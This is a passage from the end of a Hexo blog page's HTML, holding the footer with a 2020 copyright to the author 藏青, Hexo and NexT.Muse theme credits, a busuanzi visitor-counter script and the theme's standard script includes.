  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
